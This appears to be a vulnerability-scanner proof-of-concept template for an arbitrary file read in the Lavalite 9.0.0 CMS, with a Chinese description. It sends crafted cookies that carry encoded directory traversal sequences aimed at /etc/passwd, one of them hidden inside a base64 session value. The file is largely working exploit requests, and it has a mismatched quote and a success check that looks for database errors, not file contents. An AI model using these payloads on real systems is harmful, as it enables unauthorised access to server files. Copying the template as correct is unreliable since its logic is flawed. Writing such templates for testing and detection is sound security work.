id: CVE-nu11secur1ty

info:
  name: LavaLite读取任意文件
  author: daffainfo
  severity: critical
  description: Lavalite-9.0.0 的 XSRF-TOKEN cookie 容易受到路径遍历攻击，从而可以读取服务器上的任意文件。恶意用户可以从此 CMS 系统获取非常敏感的信息
  reference:
    - https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/LavaLite

set:
  hosturl: request.url
rules:
  r0:
    request:
      method: GET
      path: /cms-master/website/public/about.html
      headers:
        Referer: "{{hosturl}}/cms-master/website/public/"
        Cookie: XSRF-TOKEN=eyJpdiI6IjNZbEZudjg0RXpFNEVLWHBUK0p6R1E9PSIsInZhbHVlIjoiNjFVbmZUVUJQWVdYWXJVOUVJRWVVdHN0UWtOQjJXZGRiS2N4T2lkM0VDeXFxcDRZdG1tRFVaQUk3dlhsWHRvOVQxVnQvbFhWRUJTbUllczh6MmhFUE84N1puNVFMSVFFeWdmRlJUYkdFRGdCakZ4eEJXeHllRTdFOFNPK0pLcnkiLCJtYWMiOiJhMDBlZWFiNDFlNzE2Yzc1ZjA2NzEzYzY2Y2U0ZDQ3NzdkMTI4OTY1NjA4OTNmNDE4ZDNmNWRkYzFkN2IzMWEwIiwidGFnIjoiIn0%3D; lavalite_session=eyJpdiI6ImxiWmVuV0xlU3ZtVWhLVW1Oc2duSEE9PSIsInZhbHVlIjoiUG5WMjhMNVppUkhST1Bta1FOd1VJUDR5ZW1lRU56bXpDTnpaVzkrUHFzQzJpKzE4YlFuNEQ2RnNlKzM2Tkg0Y2VZMExCRTBUUnRQajlpTmJCUXJjT3ZETzV6OVZveURuaTFHOHdoN3pneUR3NGhQc09OUjdKb0VreFV1Y0tuOTgiLCJtYWMiOiJlMTdlMTAyZTQ3MmMyMjZlMWE5MTkwMzc0NTU2OTFkOTlmOTM4MGVlZDE4NWU4MGNkZGM4OTllMTRmYTE3MGM1IiwidGFnIjoiJTJlJTJlJTJmJTJlJTJlJTJmJTJlJTJlJTJmJTJlJTJlJTJmJTJlJTJlJTJmJTJlJTJlJTJmJTJlJTJlJTJmJTJlJTJlJTJmJTJlJTJlJTJmJTJlJTJlJTJmZXRjJTJmcGFzc3dkIn0%3d
        Cache-Control: max-age=0
        Upgrade-Insecure-Requests: 1
        Sec-CH-UA-Platform: Windows
        Sec-CH-UA-Mobile: ?0
    expression: |
                response.body.bcontains(b'cms-master/website/public/themes/public/assets/dist/js/manifest.js"></script>') &&
                response.body.bcontains(b'cms-master/website/public/themes/public/assets/dist/js/vendor.js"></script>') &&
                response.body.bcontains(b'cms-master/website/public/themes/public/assets/dist/js/app.js"></script>') &&
                response.body.bcontains(b'cms-master/website/public/themes/public/assets/js/main.js"></script>') &&
                response.body.bcontains(b'cms-master/website/public/themes/public/assets/js/theme.js"></script>')
  r1:
    request:
      method: POST
      path: /cms-master/website/public/client/password/email
      headers:
        Referer: "{{hosturl}}/cms-master/website/public/client/password/reset"
        Cookie: lavalite_session=eyJpdiI6InpmWi90N0lOeWJWKzc1Zjd5V0lickE9PSIsInZhbHVlIjoiUXVORTlPWks1RFJJb2Y4c1dxS2hNWndFWVgvSEM1WC9td05SVW1kdnlCemh1V2VxUmJXQXlQdUZ5b0xqaVkrcXdOaGpWOFcyVHc0ZjBWM2dYemY2SDZISDI1bGpSQSt4bEFiU2R3aGdwMDZ3d1I2UTZVT1dESnpVdCtHWnNjUTgiLCJtYWMiOiI4OWY3OTJhODFjNzEzZGM3Zjk4M2JkZDc3Zjk4NjZiZTA3ZDI2OTMxYTRhNDIyYzg2MjczZWM1ZTkzOGJhYzg2IiwidGFnIjoiIn0%3D; XSRF-TOKEN=...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2fetc%2fpasswd; laravel_session=eyJpdiI6Ii9oOTBjSEdkcWlNN3JIUXNZOHBGbXc9PSIsInZhbHVlIjoiWEZ5UE1GajhxaWE2ZmsvQkx3eDE4elRYSnV5VzJzVXIxdFNzYU4rZTZLR21zOHlTYklLZ2hKb2IyQnRFTnNqY1p3Y3YwcUZCc0wrV2pFcjZoY01aY3FPUUJxdjNQTjhJOHVnSjBSbzEyOVVPK21GdkRkRUNodFJiZWpKMGNBRTAiLCJtYWMiOiIwYWZkYjJlZGEzNDJmYmI5ZWU0MWE5MDhmZGI3ZTZiYWZlNDBmNDY2MjNhYjkzNjVjZTc1NzIzNWZiMGYzZTE1IiwidGFnIjoiIn0%3D
      body: |
        _method=POST&_token=j5XD58RTjQX3mae6tp4wwOdx1R9gYwjgnmm17Iqc&email=oHKlxlha%40burpcollaborator.net&_token=j5XD58RTjQX3mae6tp4wwOdx1R9gYwjgnmm17Iqc
    expression: response.body.bcontains(b'Access denied for user') && response.body.bcontains(b'QueryException:")
expression: r0() && r1()